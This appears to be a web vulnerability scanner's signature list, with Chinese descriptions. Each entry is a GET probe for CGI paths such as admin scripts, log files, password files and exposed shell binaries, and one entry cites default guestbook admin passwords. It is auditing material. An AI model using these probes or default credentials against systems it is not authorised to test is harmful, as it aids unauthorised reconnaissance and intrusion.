+1491#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgbadmin.cgi?action=setup#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#RNN 留言板 1.2版本含有多个漏洞，包括：远程管理员密码，删除帖子，改变设置，远程执行命令和更多。默认管理员密码不是‘admin’就是‘demo’#d9Fa0j#
+1492#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgbpass.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#RNN 留言板 1.2版本密码存储文件，管理员密码是明文的，同目录下访问gbadmin.cgi就可以获知，默认管理员密码是‘admin’和‘demo’#d9Fa0j#
+1524#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSGW5/GWWEB.EXE#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Groupwise web接口#d9Fa0j#
+1599#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdbmlparser.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1936#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS.fhp#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1937#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSadd_ftp.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1938#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSadmin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1939#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSadmin.php#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1940#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSadmin.php3#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1941#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSadmin.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1942#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSadminhot.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...一直被视为从另一个CGI扫描器在网络日志。#d9Fa0j#
+1943#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSadminwww.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...一直被视为从另一个CGI扫描器在网络日志。#d9Fa0j#
+1944#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSAnyBoard.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1945#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSAnyForm#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1946#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSAnyForm2#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1947#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSash#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+1948#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSax-admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1949#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSax.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1950#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSaxs.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1951#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbash#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+1952#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbnbform#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1953#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbnbform.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1954#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScart.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1955#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgimail.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1956#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSclassifieds#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1957#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSclassifieds.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1958#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSclickcount.pl?view=test#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1959#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScode.php#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1960#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScode.php3#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1961#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScount.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1962#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScsh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+1963#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScstat.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1964#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSc_download.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1966#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSday5datacopier.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1967#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdfire.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1968#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdig.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1969#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdisplayTC.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1970#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSedit.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1971#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSenter.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1972#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSenviron.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1974#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSex-logger.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1975#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSexcite#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1976#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSfilemail#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1977#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSfilemail.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1978#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSftp.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...文件传输是被允许的？#d9Fa0j#
+1979#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSftpsh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+1980#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgetdoc.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1981#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSglimpse#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1982#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShitview.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1983#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSjailshell#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+1984#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSjj#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#允许攻击者执行的HTTP守护进程的命令#d9Fa0j#
+1985#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSksh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+1986#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlog-reader.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1987#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlog/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1988#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlogin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1989#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlogin.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1990#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlogit.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1991#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlogs.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1992#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlogs/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1993#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlogs/access_log#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1994#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlogs/error_log#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1995#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlookwho.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1996#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmaillist.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1997#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmaillist.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1998#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSman.sh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+1999#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmeta.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2000#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSminimal.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2001#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnlog-smb.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2002#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnlog-smb.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2003#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnoshell#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+2004#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnph-publish#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2005#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSntitar.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2006#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpass#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2007#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpasswd#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2009#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpassword#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2010#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpost_query#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2011#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpu3.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2012#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSratlog.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2013#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSresponder.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2014#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2015#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrksh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+2016#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrsh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+2017#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsearch.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2018#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsearch.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2019#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsession/adminlogin#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2020#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+2021#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSshow.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2022#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstat/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2024#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstats.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2025#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstats.prf#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2026#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstats/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2027#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstatsconfig#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2028#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstats_old/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2029#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstatview.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2030#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsurvey#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2031#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsurvey.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2032#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStablebuild.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2033#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStcsh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+2034#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStest.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2035#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStest/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2036#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStextcounter.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2037#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStidfinder.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2038#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStigvote.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2039#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStpgnrock#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2040#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSultraboard.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2041#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSultraboard.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2042#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSviewlogs.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2043#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSvisitor.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2044#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSw3-msql#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2045#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSw3-sql#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2046#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebais#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2047#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebbbs.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2048#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebbbs.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2049#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebutil.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...一直被视为从另一个CGI扫描器在网络日志。#d9Fa0j#
+2050#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebutils.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...一直被视为从另一个CGI扫描器在网络日志。#d9Fa0j#
+2051#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebwho.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...一直被视为从另一个CGI扫描器在网络日志。#d9Fa0j#
+2052#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2053#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwww-sql#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2054#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwwwboard.cgi.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2055#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwwwboard.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2056#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwwwstats.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2057#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwwwthreads/3tvars.pm#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2058#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwwwthreads/w3tvars.pm#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+2059#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSzsh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现可利用目录信息泄露...可能是一个系统shell发现。#d9Fa0j#
+2623#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSadduser.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2624#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSamadmin.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2625#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSanyboard.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2626#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSAT-generate.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2627#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSauctiondeluxe/auction.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2628#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSawl/auctionweaver.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2629#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbb-ack.sh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2630#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbb-histlog.sh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2631#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbb-rep.sh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2632#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbb-replog.sh#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2633#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbbs_forum.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2634#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbuild.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2635#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbulk/bulk.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2636#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScached_feed.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2637#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScalender_admin.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
